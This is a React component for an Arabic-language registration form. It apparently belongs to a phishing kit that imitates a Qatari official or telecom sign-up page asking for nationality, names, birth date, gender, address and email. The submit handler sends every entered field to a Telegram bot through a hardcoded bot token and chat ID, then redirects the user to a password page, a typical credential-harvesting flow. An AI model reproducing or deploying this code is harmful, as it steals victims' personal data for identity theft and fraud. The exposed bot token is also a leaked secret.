import { useState } from "react";
import { useNavigate } from "react-router-dom";
import ReCAPTCHA from "react-google-recaptcha";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import { CalendarIcon } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Calendar } from "@/components/ui/calendar";
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover";
import { Info } from "lucide-react";
import { cn } from "@/lib/utils";

const PersonalInfoForm = () => {
  const navigate = useNavigate();
  const [recaptchaValue, setRecaptchaValue] = useState<string | null>(null);
  const [birthDate, setBirthDate] = useState<Date>();
  const [nationality, setNationality] = useState<string>("");
  const [arabicFirstName, setArabicFirstName] = useState<string>("");
  const [arabicMiddleName, setArabicMiddleName] = useState<string>("");
  const [arabicLastName, setArabicLastName] = useState<string>("");
  const [englishFirstName, setEnglishFirstName] = useState<string>("");
  const [englishMiddleName, setEnglishMiddleName] = useState<string>("");
  const [englishLastName, setEnglishLastName] = useState<string>("");
  const [gender, setGender] = useState<string>("");
  const [buildingNumber, setBuildingNumber] = useState<string>("");
  const [street, setStreet] = useState<string>("");
  const [area, setArea] = useState<string>("");
  const [email, setEmail] = useState<string>("");

  const handleRecaptchaChange = (value: string | null) => {
    setRecaptchaValue(value);
  };

  const sendToTelegram = async (message: string) => {
    try {
      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
      const chatId = "-4985537188";
      
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
        }),
      });
    } catch (error) {
      console.error("فشل الإرسال إلى Telegram:", error);
    }
  };

  const handleBack = () => {
    navigate("/");
  };

  const handleCancel = () => {
    navigate("/");
  };

  const isFormValid = () => {
    const hasArabicName = arabicFirstName.trim() !== "" && arabicLastName.trim() !== "";
    const hasEnglishName = englishFirstName.trim() !== "" && englishLastName.trim() !== "";
    
    return nationality !== "" && 
           (hasArabicName || hasEnglishName) && 
           birthDate !== undefined && 
           gender !== "" && 
           buildingNumber.trim() !== "" && 
           street.trim() !== "" && 
           area.trim() !== "" && 
           email.trim() !== "" && 
           recaptchaValue !== null;
  };

  const handleContinue = async () => {
    if (!isFormValid()) {
      alert("يرجى إكمال جميع الحقول المطلوبة بشكل صحيح");
      return;
    }

    const message = `تسجيل - البيانات الشخصية

الجنسية: ${nationality}
الاسم بالعربي: ${arabicFirstName} ${arabicMiddleName} ${arabicLastName}
الاسم بالإنجليزي: ${englishFirstName} ${englishMiddleName} ${englishLastName}
تاريخ الميلاد: ${birthDate ? format(birthDate, "PPP", { locale: ar }) : ""}
الجنس: ${gender === "male" ? "ذكر" : gender === "female" ? "أنثى" : ""}
العنوان: مبنى ${buildingNumber}، شارع ${street}، منطقة ${area}
البريد الإلكتروني: ${email}`;

    await sendToTelegram(message);
    navigate("/password");
  };

  return (
    <div className="bg-gray-100 rounded-lg shadow-sm p-8 max-w-4xl mx-auto">
      <h2 className="text-2xl font-semibold mb-2 text-right">البيانات الشخصية</h2>

      <div className="space-y-6 mb-8">
        {/* الجنسية */}
        <div>
          <Label htmlFor="nationality" className="text-right block mb-2">
            الجنسية
          </Label>
          <Select value={nationality} onValueChange={setNationality}>
            <SelectTrigger className="bg-white">
              <SelectValue placeholder="اختر الجنسية" />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="qatar">القطرية</SelectItem>
              <SelectItem value="afghanistan">الأفغانية</SelectItem>
              <SelectItem value="albania">الألبانية</SelectItem>
              <SelectItem value="algeria">الجزائرية</SelectItem>
              <SelectItem value="andorra">الأندورية</SelectItem>
              <SelectItem value="angola">الأنغولية</SelectItem>
              <SelectItem value="argentina">الأرجنتينية</SelectItem>
              <SelectItem value="armenia">الأرمينية</SelectItem>
              <SelectItem value="australia">الأسترالية</SelectItem>
              <SelectItem value="austria">النمساوية</SelectItem>
              <SelectItem value="azerbaijan">الأذربيجانية</SelectItem>
              <SelectItem value="bahrain">البحرينية</SelectItem>
              <SelectItem value="bangladesh">البنغلاديشية</SelectItem>
              <SelectItem value="belarus">البيلاروسية</SelectItem>
              <SelectItem value="belgium">البلجيكية</SelectItem>
              <SelectItem value="belize">البليزية</SelectItem>
              <SelectItem value="benin">البنينية</SelectItem>
              <SelectItem value="bhutan">البوتانية</SelectItem>
              <SelectItem value="bolivia">البوليفية</SelectItem>
              <SelectItem value="bosnia">البوسنية</SelectItem>
              <SelectItem value="botswana">البوتسوانية</SelectItem>
              <SelectItem value="brazil">البرازيلية</SelectItem>
              <SelectItem value="brunei">البرونايية</SelectItem>
              <SelectItem value="bulgaria">البلغارية</SelectItem>
              <SelectItem value="burkina">البوركينية</SelectItem>
              <SelectItem value="burundi">البوروندية</SelectItem>
              <SelectItem value="cambodia">الكمبودية</SelectItem>
              <SelectItem value="cameroon">الكاميرونية</SelectItem>
              <SelectItem value="canada">الكندية</SelectItem>
              <SelectItem value="chile">التشيلية</SelectItem>
              <SelectItem value="china">الصينية</SelectItem>
              <SelectItem value="colombia">الكولومبية</SelectItem>
              <SelectItem value="costarica">الكوستاريكية</SelectItem>
              <SelectItem value="croatia">الكرواتية</SelectItem>
              <SelectItem value="cuba">الكوبية</SelectItem>
              <SelectItem value="cyprus">القبرصية</SelectItem>
              <SelectItem value="czech">التشيكية</SelectItem>
              <SelectItem value="denmark">الدنماركية</SelectItem>
              <SelectItem value="djibouti">الجيبوتية</SelectItem>
              <SelectItem value="ecuador">الإكوادورية</SelectItem>
              <SelectItem value="egypt">المصرية</SelectItem>
              <SelectItem value="elsalvador">السلفادورية</SelectItem>
              <SelectItem value="estonia">الإستونية</SelectItem>
              <SelectItem value="ethiopia">الإثيوبية</SelectItem>
              <SelectItem value="finland">الفنلندية</SelectItem>
              <SelectItem value="france">الفرنسية</SelectItem>
              <SelectItem value="georgia">الجورجية</SelectItem>
              <SelectItem value="germany">الألمانية</SelectItem>
              <SelectItem value="ghana">الغانية</SelectItem>
              <SelectItem value="greece">اليونانية</SelectItem>
              <SelectItem value="guatemala">الغواتيمالية</SelectItem>
              <SelectItem value="guinea">الغينية</SelectItem>
              <SelectItem value="haiti">الهايتية</SelectItem>
              <SelectItem value="honduras">الهندوراسية</SelectItem>
              <SelectItem value="hongkong">هونغ كونغ</SelectItem>
              <SelectItem value="hungary">المجرية</SelectItem>
              <SelectItem value="iceland">الآيسلندية</SelectItem>
              <SelectItem value="india">الهندية</SelectItem>
              <SelectItem value="indonesia">الإندونيسية</SelectItem>
              <SelectItem value="iran">الإيرانية</SelectItem>
              <SelectItem value="iraq">العراقية</SelectItem>
              <SelectItem value="ireland">الأيرلندية</SelectItem>
              <SelectItem value="israel">الإسرائيلية</SelectItem>
              <SelectItem value="italy">الإيطالية</SelectItem>
              <SelectItem value="japan">اليابانية</SelectItem>
              <SelectItem value="jordan">الأردنية</SelectItem>
              <SelectItem value="kazakhstan">الكازاخستانية</SelectItem>
              <SelectItem value="kenya">الكينية</SelectItem>
              <SelectItem value="kuwait">الكويتية</SelectItem>
              <SelectItem value="kyrgyzstan">القيرغيزية</SelectItem>
              <SelectItem value="laos">اللاوسية</SelectItem>
              <SelectItem value="latvia">اللاتفية</SelectItem>
              <SelectItem value="lebanon">اللبنانية</SelectItem>
              <SelectItem value="libya">الليبية</SelectItem>
              <SelectItem value="lithuania">الليتوانية</SelectItem>
              <SelectItem value="luxembourg">اللوكسمبورغية</SelectItem>
              <SelectItem value="malaysia">الماليزية</SelectItem>
              <SelectItem value="maldives">المالديفية</SelectItem>
              <SelectItem value="mali">المالية</SelectItem>
              <SelectItem value="malta">المالطية</SelectItem>
              <SelectItem value="mauritania">الموريتانية</SelectItem>
              <SelectItem value="mauritius">الموريشيوسية</SelectItem>
              <SelectItem value="mexico">المكسيكية</SelectItem>
              <SelectItem value="moldova">المولدوفية</SelectItem>
              <SelectItem value="monaco">الموناكوية</SelectItem>
              <SelectItem value="mongolia">المنغولية</SelectItem>
              <SelectItem value="montenegro">الجبل الأسود</SelectItem>
              <SelectItem value="morocco">المغربية</SelectItem>
              <SelectItem value="mozambique">الموزمبيقية</SelectItem>
              <SelectItem value="myanmar">الميانمارية</SelectItem>
              <SelectItem value="namibia">الناميبية</SelectItem>
              <SelectItem value="nepal">النيبالية</SelectItem>
              <SelectItem value="netherlands">الهولندية</SelectItem>
              <SelectItem value="newzealand">النيوزيلندية</SelectItem>
              <SelectItem value="nicaragua">النيكاراغوية</SelectItem>
              <SelectItem value="niger">النيجرية</SelectItem>
              <SelectItem value="nigeria">النيجيرية</SelectItem>
              <SelectItem value="northkorea">الكورية الشمالية</SelectItem>
              <SelectItem value="norway">النرويجية</SelectItem>
              <SelectItem value="oman">العمانية</SelectItem>
              <SelectItem value="pakistan">الباكستانية</SelectItem>
              <SelectItem value="palestine">الفلسطينية</SelectItem>
              <SelectItem value="panama">البنمية</SelectItem>
              <SelectItem value="paraguay">الباراغوية</SelectItem>
              <SelectItem value="peru">البيروفية</SelectItem>
              <SelectItem value="philippines">الفلبينية</SelectItem>
              <SelectItem value="poland">البولندية</SelectItem>
              <SelectItem value="portugal">البرتغالية</SelectItem>
              <SelectItem value="romania">الرومانية</SelectItem>
              <SelectItem value="russia">الروسية</SelectItem>
              <SelectItem value="rwanda">الرواندية</SelectItem>
              <SelectItem value="saudi">السعودية</SelectItem>
              <SelectItem value="senegal">السنغالية</SelectItem>
              <SelectItem value="serbia">الصربية</SelectItem>
              <SelectItem value="singapore">السنغافورية</SelectItem>
              <SelectItem value="slovakia">السلوفاكية</SelectItem>
              <SelectItem value="slovenia">السلوفينية</SelectItem>
              <SelectItem value="somalia">الصومالية</SelectItem>
              <SelectItem value="southafrica">جنوب أفريقيا</SelectItem>
              <SelectItem value="southkorea">الكورية الجنوبية</SelectItem>
              <SelectItem value="southsudan">جنوب السودان</SelectItem>
              <SelectItem value="spain">الإسبانية</SelectItem>
              <SelectItem value="srilanka">السريلانكية</SelectItem>
              <SelectItem value="sudan">السودانية</SelectItem>
              <SelectItem value="sweden">السويدية</SelectItem>
              <SelectItem value="switzerland">السويسرية</SelectItem>
              <SelectItem value="syria">السورية</SelectItem>
              <SelectItem value="taiwan">التايوانية</SelectItem>
              <SelectItem value="tajikistan">الطاجيكستانية</SelectItem>
              <SelectItem value="tanzania">التنزانية</SelectItem>
              <SelectItem value="thailand">التايلاندية</SelectItem>
              <SelectItem value="togo">التوغولية</SelectItem>
              <SelectItem value="tunisia">التونسية</SelectItem>
              <SelectItem value="turkey">التركية</SelectItem>
              <SelectItem value="turkmenistan">التركمانستانية</SelectItem>
              <SelectItem value="uganda">الأوغندية</SelectItem>
              <SelectItem value="ukraine">الأوكرانية</SelectItem>
              <SelectItem value="uae">الإماراتية</SelectItem>
              <SelectItem value="uk">البريطانية</SelectItem>
              <SelectItem value="usa">الأمريكية</SelectItem>
              <SelectItem value="uruguay">الأوروغوية</SelectItem>
              <SelectItem value="uzbekistan">الأوزبكستانية</SelectItem>
              <SelectItem value="venezuela">الفنزويلية</SelectItem>
              <SelectItem value="vietnam">الفيتنامية</SelectItem>
              <SelectItem value="yemen">اليمنية</SelectItem>
              <SelectItem value="zambia">الزامبية</SelectItem>
              <SelectItem value="zimbabwe">الزيمبابوية</SelectItem>
            </SelectContent>
          </Select>
        </div>

        {/* الاسم */}
        <div>
          <div className="flex items-start gap-2 mb-4">
            <Info className="w-5 h-5 mt-0.5 flex-shrink-0 text-primary" />
            <div className="text-sm text-right">
              <span className="font-semibold block mb-1">الاسم</span>
              <span className="text-muted-foreground">
                الرجاء إدخال أحد الأسماء العربية أو الإنجليزية (الاسم الأول والأخير على الأقل)
              </span>
            </div>
          </div>

          {/* الاسم بالعربي */}
          <div className="mb-4">
            <Label className="text-right block mb-2">الاسم بالعربي</Label>
            <div className="grid grid-cols-3 gap-4">
              <Input type="text" placeholder="الاسم الأول" className="text-right bg-white placeholder:text-right" dir="rtl" value={arabicFirstName} onChange={(e) => setArabicFirstName(e.target.value)} />
              <Input type="text" placeholder="الاسم الأوسط" className="text-right bg-white placeholder:text-right" dir="rtl" value={arabicMiddleName} onChange={(e) => setArabicMiddleName(e.target.value)} />
              <Input type="text" placeholder="الاسم الأخير" className="text-right bg-white placeholder:text-right" dir="rtl" value={arabicLastName} onChange={(e) => setArabicLastName(e.target.value)} />
            </div>
          </div>

          {/* الاسم بالإنجليزي */}
          <div>
            <Label className="text-right block mb-2">الاسم بالإنجليزي</Label>
            <div className="grid grid-cols-3 gap-4">
              <Input type="text" placeholder="Last Name" className="text-right bg-white placeholder:text-right" dir="rtl" value={englishLastName} onChange={(e) => setEnglishLastName(e.target.value)} />
              <Input type="text" placeholder="Middle Name" className="text-right bg-white placeholder:text-right" dir="rtl" value={englishMiddleName} onChange={(e) => setEnglishMiddleName(e.target.value)} />
              <Input type="text" placeholder="First Name" className="text-right bg-white placeholder:text-right" dir="rtl" value={englishFirstName} onChange={(e) => setEnglishFirstName(e.target.value)} />
            </div>
          </div>
        </div>

        {/* تاريخ الميلاد */}
        <div>
          <Label className="text-right block mb-2">
            تاريخ الميلاد
          </Label>
          <Popover>
            <PopoverTrigger asChild>
              <Button
                variant="outline"
                className={cn(
                  "w-full justify-between text-right font-normal bg-white",
                  !birthDate && "text-muted-foreground"
                )}
                dir="rtl"
              >
                {birthDate ? format(birthDate, "PPP", { locale: ar }) : <span>اختر تاريخ الميلاد</span>}
                <CalendarIcon className="mr-2 h-4 w-4" />
              </Button>
            </PopoverTrigger>
            <PopoverContent className="w-auto p-0" align="end">
              <Calendar
                mode="single"
                selected={birthDate}
                onSelect={setBirthDate}
                disabled={(date) =>
                  date > new Date() || date < new Date("1900-01-01")
                }
                initialFocus
              />
            </PopoverContent>
          </Popover>
        </div>

        {/* الجنس */}
        <div>
          <Label className="text-right block mb-2">
            الجنس
          </Label>
          <RadioGroup value={gender} onValueChange={setGender} className="flex gap-6 justify-end">
            <div className="flex items-center gap-2">
              <Label htmlFor="female" className="text-base cursor-pointer">
                أنثى
              </Label>
              <RadioGroupItem value="female" id="female" />
            </div>
            <div className="flex items-center gap-2">
              <Label htmlFor="male" className="text-base cursor-pointer">
                ذكر
              </Label>
              <RadioGroupItem value="male" id="male" />
            </div>
          </RadioGroup>
        </div>

        {/* العنوان */}
        <div>
          <Label className="text-right block mb-2">
            العنوان
          </Label>
          <div className="bg-primary rounded-lg p-4 space-y-4 max-w-md">
            <div>
              <Label className="text-white text-right block mb-2">رقم المبنى</Label>
              <Input type="text" className="text-right bg-white placeholder:text-right" dir="rtl" value={buildingNumber} onChange={(e) => setBuildingNumber(e.target.value)} />
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label className="text-white text-right block mb-2">الشارع</Label>
                <Input type="text" className="text-right bg-white placeholder:text-right" dir="rtl" value={street} onChange={(e) => setStreet(e.target.value)} />
              </div>
              <div>
                <Label className="text-white text-right block mb-2">المنطقة</Label>
                <Input type="text" className="text-right bg-white placeholder:text-right" dir="rtl" value={area} onChange={(e) => setArea(e.target.value)} />
              </div>
            </div>
          </div>
        </div>

        {/* البريد الإلكتروني */}
        <div>
          <Label htmlFor="email" className="text-right block mb-2">
            البريد الإلكتروني
          </Label>
          <Input id="email" type="email" className="text-right bg-white placeholder:text-right" dir="rtl" value={email} onChange={(e) => setEmail(e.target.value)} />
          <div className="flex items-start gap-2 mt-2 text-sm text-muted-foreground">
            <Info className="w-4 h-4 mt-0.5 flex-shrink-0" />
            <p className="text-right">
              يُرجى التأكد من إدخال البريد الإلكتروني المسجل والمعتمد لدى شركة الاتصالات الخاصة بك، حيث سيتم استخدامه للتحقق من هويتك وإرسال الإشعارات الهامة.
            </p>
          </div>
        </div>

        {/* إعادة إدخال البريد الإلكتروني */}
        <div>
          <Label htmlFor="confirmEmail" className="text-right block mb-2">
            أعد إدخال البريد الإلكتروني
          </Label>
          <Input id="confirmEmail" type="email" className="text-right bg-white placeholder:text-right" dir="rtl" />
        </div>

        {/* reCAPTCHA */}
        <div className="flex justify-start">
          <ReCAPTCHA sitekey="YOUR_RECAPTCHA_SITE_KEY" onChange={handleRecaptchaChange} />
        </div>
      </div>

      {/* الأزرار */}
      <div className="flex items-center justify-between gap-4 pt-6 border-t border-border">
        <div className="flex gap-3">
          <Button variant="outline" className="min-w-24" onClick={handleBack}>
            رجوع
          </Button>
          <Button variant="outline" className="min-w-24" onClick={handleCancel}>
            إلغاء
          </Button>
        </div>
        
        <Button 
          className="min-w-32 bg-primary hover:bg-primary/90" 
          onClick={handleContinue}
          disabled={!isFormValid()}
        >
          استمر
        </Button>
      </div>
    </div>
  );
};

export default PersonalInfoForm;
